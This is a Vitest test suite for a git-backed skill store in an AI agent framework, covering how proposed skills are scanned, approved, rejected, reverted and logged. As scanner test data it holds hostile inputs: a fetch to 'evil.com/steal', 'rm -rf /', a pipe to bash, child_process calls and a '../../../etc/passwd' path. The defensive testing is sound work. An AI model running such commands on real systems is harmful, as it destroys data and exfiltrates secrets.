import { describe, test, expect, beforeEach, afterEach } from 'vitest';
import { mkdirSync, rmSync, existsSync, writeFileSync, readFileSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import { randomUUID } from 'node:crypto';
import type { SkillStoreProvider, Config } from '../../src/providers/types.js';

// We need to run in a temp directory so skills/ is isolated
let testDir: string;
let originalCwd: string;
let provider: SkillStoreProvider;

function mockConfig(): Config {
  return {
    profile: 'balanced',
    providers: {
      llm: 'mock', memory: 'file', scanner: 'basic',
      channels: ['cli'], web: 'none', browser: 'none',
      credentials: 'env', skills: 'git', audit: 'file',
      sandbox: 'subprocess', scheduler: 'none',
    },
    sandbox: { timeout_sec: 30, memory_mb: 256 },
    scheduler: {
      active_hours: { start: '08:00', end: '22:00', timezone: 'UTC' },
      max_token_budget: 1000,
      heartbeat_interval_min: 5,
    },
  };
}

beforeEach(async () => {
  testDir = join(tmpdir(), `ax-skills-git-test-${randomUUID()}`);
  mkdirSync(testDir, { recursive: true });
  originalCwd = process.cwd();
  process.chdir(testDir);

  // Dynamic import to create fresh provider each test
  const { create } = await import('../../src/providers/skills/git.js');
  provider = await create(mockConfig());
});

afterEach(() => {
  process.chdir(originalCwd);
  if (existsSync(testDir)) {
    rmSync(testDir, { recursive: true, force: true });
  }
});

describe('skills-git provider', () => {

  describe('list and read', () => {
    test('lists skill files', async () => {
      // Create a skill file
      writeFileSync(join(testDir, 'skills', 'greeting.md'), '# Greeting\nSay hello!');

      const skills = await provider.list();
      expect(skills).toHaveLength(1);
      expect(skills[0].name).toBe('greeting');
    });

    test('reads skill content', async () => {
      writeFileSync(join(testDir, 'skills', 'helper.md'), '# Helper Skill\n\nDo helpful things.');

      const content = await provider.read('helper');
      expect(content).toBe('# Helper Skill\n\nDo helpful things.');
    });

    test('list returns empty for empty skills dir', async () => {
      const skills = await provider.list();
      expect(skills).toHaveLength(0);
    });
  });

  describe('propose - auto-approve', () => {
    test('auto-approves safe content', async () => {
      const result = await provider.propose({
        skill: 'safe-skill',
        content: '# Safe Skill\n\nThis is a safe markdown skill with no code.',
        reason: 'Adding a safe skill',
      });

      expect(result.verdict).toBe('AUTO_APPROVE');
      expect(result.id).toBeDefined();

      // File should exist and be committed
      const content = await provider.read('safe-skill');
      expect(content).toBe('# Safe Skill\n\nThis is a safe markdown skill with no code.');
    });

    test('auto-approved skills appear in list', async () => {
      await provider.propose({
        skill: 'listed-skill',
        content: '# Listed\nShould appear in list.',
      });

      const skills = await provider.list();
      expect(skills.some(s => s.name === 'listed-skill')).toBe(true);
    });
  });

  describe('propose - needs review', () => {
    test('flags content with filesystem writes', async () => {
      const result = await provider.propose({
        skill: 'fs-skill',
        content: '# FS Skill\n\nUses fs.writeFileSync to save data.',
      });

      expect(result.verdict).toBe('NEEDS_REVIEW');
      expect(result.reason).toContain('filesystem-write');
    });

    test('flags content with process.env access', async () => {
      const result = await provider.propose({
        skill: 'env-skill',
        content: '# Env Skill\n\nReads process.env for configuration.',
      });

      expect(result.verdict).toBe('NEEDS_REVIEW');
      expect(result.reason).toContain('env-access');
    });

    test('needs-review proposals are not committed until approved', async () => {
      const result = await provider.propose({
        skill: 'pending-skill',
        content: '# Pending\n\nUses process.env to configure.',
      });

      expect(result.verdict).toBe('NEEDS_REVIEW');

      // File should NOT exist yet
      const skills = await provider.list();
      expect(skills.some(s => s.name === 'pending-skill')).toBe(false);
    });
  });

  describe('propose - hard reject', () => {
    test('rejects eval()', async () => {
      const result = await provider.propose({
        skill: 'evil-skill',
        content: '# Evil\n\neval("dangerous code")',
      });

      expect(result.verdict).toBe('REJECT');
      expect(result.reason).toContain('eval()');
    });

    test('rejects exec()', async () => {
      const result = await provider.propose({
        skill: 'exec-skill',
        content: '# Exec\n\nexec("rm -rf /")',
      });

      expect(result.verdict).toBe('REJECT');
      expect(result.reason).toContain('exec()');
    });

    test('rejects child_process', async () => {
      const result = await provider.propose({
        skill: 'cp-skill',
        content: '# CP\n\nrequire("child_process").execSync("ls")',
      });

      expect(result.verdict).toBe('REJECT');
      expect(result.reason).toContain('child_process');
    });

    test('rejects new Function()', async () => {
      const result = await provider.propose({
        skill: 'func-skill',
        content: '# Func\n\nnew Function("return this")',
      });

      expect(result.verdict).toBe('REJECT');
      expect(result.reason).toContain('Function constructor');
    });

    test('rejects base64 decode', async () => {
      const result = await provider.propose({
        skill: 'b64-skill',
        content: '# B64\n\natob("ZGFuZ2Vyb3Vz")',
      });

      expect(result.verdict).toBe('REJECT');
      expect(result.reason).toContain('atob()');
    });

    test('rejects fetch()', async () => {
      const result = await provider.propose({
        skill: 'net-skill',
        content: '# Net\n\nfetch("https://evil.com/steal")',
      });

      expect(result.verdict).toBe('REJECT');
      expect(result.reason).toContain('fetch()');
    });

    test('rejects pipe to shell', async () => {
      const result = await provider.propose({
        skill: 'pipe-skill',
        content: '# Pipe\n\necho "data" | bash',
      });

      expect(result.verdict).toBe('REJECT');
      expect(result.reason).toContain('pipe to shell');
    });

    test('rejects dangerous module imports', async () => {
      const result = await provider.propose({
        skill: 'import-skill',
        content: '# Import\n\nimport net from "net"',
      });

      expect(result.verdict).toBe('REJECT');
      expect(result.reason).toContain('dangerous module import');
    });

    test('rejected proposals are not stored', async () => {
      const result = await provider.propose({
        skill: 'rejected',
        content: 'eval("bad")',
      });

      expect(result.verdict).toBe('REJECT');

      // Cannot approve a rejected proposal
      await expect(provider.approve(result.id)).rejects.toThrow('Proposal not found');
    });
  });

  describe('approve', () => {
    test('approving a needs-review proposal writes and commits', async () => {
      const result = await provider.propose({
        skill: 'reviewed-skill',
        content: '# Reviewed\n\nUses process.env for config.',
      });

      expect(result.verdict).toBe('NEEDS_REVIEW');

      // Approve it
      await provider.approve(result.id);

      // File should now exist
      const content = await provider.read('reviewed-skill');
      expect(content).toBe('# Reviewed\n\nUses process.env for config.');
    });

    test('approving non-existent proposal throws', async () => {
      await expect(provider.approve('non-existent-id')).rejects.toThrow('Proposal not found');
    });

    test('double-approve throws', async () => {
      const result = await provider.propose({
        skill: 'once-only',
        content: '# Once\n\nReads process.env.',
      });

      await provider.approve(result.id);
      await expect(provider.approve(result.id)).rejects.toThrow('Proposal not found');
    });
  });

  describe('reject', () => {
    test('rejecting a needs-review proposal removes it', async () => {
      const result = await provider.propose({
        skill: 'to-reject',
        content: '# Reject Me\n\nUses process.env.',
      });

      expect(result.verdict).toBe('NEEDS_REVIEW');

      await provider.reject(result.id);

      // Cannot approve after rejection
      await expect(provider.approve(result.id)).rejects.toThrow('Proposal not found');
    });

    test('rejecting non-existent proposal throws', async () => {
      await expect(provider.reject('non-existent-id')).rejects.toThrow('Proposal not found');
    });
  });

  describe('revert', () => {
    test('reverts an auto-approved commit', async () => {
      // First, create a base skill so there's a parent commit
      await provider.propose({
        skill: 'base-skill',
        content: '# Base\n\nThis stays.',
      });

      // Create and auto-approve the skill we'll revert
      await provider.propose({
        skill: 'to-revert',
        content: '# Revert Me\n\nThis will be reverted.',
      });

      // Verify both exist
      const beforeList = await provider.list();
      expect(beforeList.some(s => s.name === 'to-revert')).toBe(true);
      expect(beforeList.some(s => s.name === 'base-skill')).toBe(true);

      // Get the commit to revert (most recent)
      const git = await import('isomorphic-git');
      const fs = await import('node:fs');
      const commits = await git.log({ fs, dir: join(testDir, 'skills'), depth: 5 });
      const latestOid = commits[0].oid;

      // Revert it
      await provider.revert(latestOid.slice(0, 7));

      // Reverted file should be gone, base should remain
      const afterList = await provider.list();
      expect(afterList.some(s => s.name === 'to-revert')).toBe(false);
      expect(afterList.some(s => s.name === 'base-skill')).toBe(true);
    });

    test('revert with non-existent commit throws', async () => {
      await expect(provider.revert('abcdef0')).rejects.toThrow('Commit not found');
    });
  });

  describe('log', () => {
    test('records propose/approve/reject actions', async () => {
      // Create various proposals
      await provider.propose({ skill: 'safe', content: '# Safe skill' });
      const review = await provider.propose({ skill: 'review', content: '# Review\nprocess.env' });
      await provider.approve(review.id);
      await provider.propose({ skill: 'bad', content: 'eval("evil")' });

      const entries = await provider.log();
      expect(entries.length).toBeGreaterThanOrEqual(4); // propose+approve, propose+approve, propose+reject

      // Newest first
      expect(entries[0].timestamp.getTime()).toBeGreaterThanOrEqual(entries[entries.length - 1].timestamp.getTime());
    });

    test('log supports limit', async () => {
      await provider.propose({ skill: 's1', content: '# S1' });
      await provider.propose({ skill: 's2', content: '# S2' });
      await provider.propose({ skill: 's3', content: '# S3' });

      const entries = await provider.log({ limit: 2 });
      expect(entries).toHaveLength(2);
    });

    test('log supports since filter', async () => {
      const before = new Date();
      await new Promise(r => setTimeout(r, 10));

      await provider.propose({ skill: 'after', content: '# After' });

      const entries = await provider.log({ since: before });
      expect(entries.length).toBeGreaterThanOrEqual(1);
      expect(entries.every(e => e.timestamp >= before)).toBe(true);
    });
  });

  describe('path traversal protection', () => {
    test('propose with path traversal in skill name is blocked', async () => {
      // safePath should sanitize the ../../../etc/passwd to something safe
      const result = await provider.propose({
        skill: '../../../etc/passwd',
        content: '# Evil path',
      });

      // The skill should be sanitized but not cause a path traversal
      // safePath replaces / and .. with _
      expect(result.verdict).toBe('AUTO_APPROVE');
      // Verify the file is inside skills/
      const skills = await provider.list();
      for (const s of skills) {
        expect(s.path).toContain('skills');
      }
    });
  });
});
